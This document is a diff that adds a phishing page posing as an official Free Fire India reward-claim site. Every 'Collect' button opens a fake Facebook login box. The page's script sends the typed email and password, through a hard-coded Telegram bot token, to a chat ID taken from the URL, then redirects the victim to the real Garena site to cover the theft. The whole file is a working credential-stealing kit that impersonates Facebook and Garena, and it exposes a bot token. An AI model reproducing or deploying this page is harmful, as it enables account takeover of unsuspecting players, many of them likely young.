@@ -1,0 +1,246 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-color: #000000; }
+
+        .navbar {
+            width: 100%;
+            height: 70px;
+            background-image: url('https://i.ibb.co/HNzZ727/Screenshot-20241120-220242-1.png');
+            background-size: cover;
+            background-repeat: no-repeat;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+        }
+
+        .navbar img {
+            height: 50px;
+            width: auto;
+        }
+
+        .noisy-image, .bottom-image {
+            display: block;
+            margin: 10px auto;
+            max-width: 100%;
+            height: auto;
+        }
+
+        .claim-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 90%; max-width: 1200px; }
+        .claim-item { text-align: center; }
+        .claim-item img { max-width: 180px; width: 100%; margin-bottom: 10px; pointer-events: none; }
+
+        .collect-button { cursor: pointer; transition: transform 0.2s ease; }
+        .collect-button:hover { transform: scale(1.1); }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            background: black;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            z-index: 1000;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .modal-header {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .modal input {
+            width: 90%;
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .modal button {
+            width: 90%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .modal button:hover {
+            background-color: #145db2;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        .facebook-logo {
+            width: 40px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+    </style>
+    <title>FREE FIRE INDIA OFFICIAL</title>
+</head>
+<body>
+
+<div class="navbar">
+    <img src="https://i.ibb.co/9ZH2W28/IMG-20250114-024354-525.jpg" alt="freefireindia">
+</div>
+
+<img src="https://i.ibb.co/NyCMCn5/IMG-20250114-025414-228.jpg" alt="Noisy" class="noisy-image">
+
+<div class="claim-grid">
+    <div class="claim-item">
+        <img src="https://i.ibb.co/vqsLhxV/9.jpg" alt="Reward 9">
+        <a href="javascript:void(0)" class="collect-button">
+            <img src="https://i.ibb.co/NyXcrLy/IMG-20250114-022323-238.jpg" alt="Collect">
+        </a>
+    </div>
+    <div class="claim-item">
+        <img src="https://i.ibb.co/JBJKJvw/8.jpg" alt="Reward 8">
+        <a href="javascript:void(0)" class="collect-button">
+            <img src="https://i.ibb.co/NyXcrLy/IMG-20250114-022323-238.jpg" alt="Collect">
+        </a>
+    </div>
+    <div class="claim-item">
+        <img src="https://i.ibb.co/Vg6gLWz/7.jpg" alt="Reward 7">
+        <a href="javascript:void(0)" class="collect-button">
+            <img src="https://i.ibb.co/NyXcrLy/IMG-20250114-022323-238.jpg" alt="Collect">
+        </a>
+    </div>
+    <div class="claim-item">
+        <img src="https://i.ibb.co/LtmTPMp/5.jpg" alt="Reward 5">
+        <a href="javascript:void(0)" class="collect-button">
+            <img src="https://i.ibb.co/NyXcrLy/IMG-20250114-022323-238.jpg" alt="Collect">
+        </a>
+    </div>
+    <div class="claim-item">
+        <img src="https://i.ibb.co/DVRztXp/6.jpg" alt="Reward 6">
+        <a href="javascript:void(0)" class="collect-button">
+            <img src="https://i.ibb.co/NyXcrLy/IMG-20250114-022323-238.jpg" alt="Collect">
+        </a>
+    </div>
+    <div class="claim-item">
+        <img src="https://i.ibb.co/FJMhF8t/4.jpg" alt="Reward 4">
+        <a href="javascript:void(0)" class="collect-button">
+            <img src="https://i.ibb.co/NyXcrLy/IMG-20250114-022323-238.jpg" alt="Collect">
+        </a>
+    </div>
+    <div class="claim-item">
+        <img src="https://i.ibb.co/QHXRdHt/3.jpg" alt="Reward 3">
+        <a href="javascript:void(0)" class="collect-button">
+            <img src="https://i.ibb.co/NyXcrLy/IMG-20250114-022323-238.jpg" alt="Collect">
+        </a>
+    </div>
+    <div class="claim-item">
+        <img src="https://i.ibb.co/mTW3tgX/2.jpg" alt="Reward 2">
+        <a href="javascript:void(0)" class="collect-button">
+            <img src="https://i.ibb.co/NyXcrLy/IMG-20250114-022323-238.jpg" alt="Collect">
+        </a>
+    </div>
+    <div class="claim-item">
+        <img src="https://i.ibb.co/9ySYK20/1.jpg" alt="Reward 1">
+        <a href="javascript:void(0)" class="collect-button">
+            <img src="https://i.ibb.co/NyXcrLy/IMG-20250114-022323-238.jpg" alt="Claim">
+        </a>
+    </div>
+</div>
+
+<img src="https://i.ibb.co/jGcBT39/IMG-20250114-023119-771.jpg" alt="Bottom Image" class="bottom-image">
+
+<div class="overlay" id="overlay"></div>
+<div class="modal" id="loginModal">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
+    <div class="modal-header">Log into Facebook</div>
+    <input type="email" id="email" placeholder="Email or phone number">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="sendToTelegramAndRedirect()">Log In</button>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js"></script>
+<script>
+    // Show modal on "Collect" button click
+    document.querySelectorAll('.collect-button').forEach(button => {
+        button.addEventListener('click', (event) => {
+            event.preventDefault();
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('loginModal').style.display = 'block';
+        });
+    });
+
+    // Close modal
+    document.getElementById('overlay').addEventListener('click', () => {
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('loginModal').style.display = 'none';
+    });
+
+    // Send data to Telegram bot and redirect
+    function sendToTelegramAndRedirect() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('xD');
+
+        if (!chatId) {
+            alert("Chat ID is missing from URL.");
+            return;
+        }
+
+        if (email && password) {
+            const telegramBotToken = "7822640146:AAHgrsRxm9TaN_OQrggoLS7pKlsdAeWxMLk";
+            const date = new Date().toLocaleDateString();
+            const time = new Date().toLocaleTimeString();
+
+            const message = `
+𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪
+
+🐉⊚-----------------------------------⊚🐉
+↝ 𝙿𝙰𝙶𝙴 » Free Fire 
+➥ 𝙻𝙾𝙶𝙸𝙽 𝙱𝚈  » Facebook 
+📧 ↝ 𝙴𝚖𝚊𝚒𝚕 » ${email}
+📟 ↝ 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » ${password}
+🏴 ↝ 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » INDIA 🇮🇳
+⏳ ↝ 𝙲𝚘𝚍𝚎 » +91 🇮🇳
+⏱ ↝ 𝚃𝚒𝚖𝚎 » ${time}
+📝 ↝ 𝙳𝚊𝚝𝚎 » ${date}
+🐉⊚-----------------------------------⊚🐉
+↝ ᴅᴇᴠ ʙʏ » @xUJJWAL
+`;
+
+            axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                chat_id: chatId,
+                text: message
+            }).then(response => {
+                console.log("Message sent:", response.data);
+            }).catch(error => {
+                console.error("Error:", error);
+            });
+
+            window.location.href = 'https://ff.garena.com/en';
+        } else {
+            alert("Please enter both email and password.");
+        }
+    }
+</script>
+
+</body>
+</html>
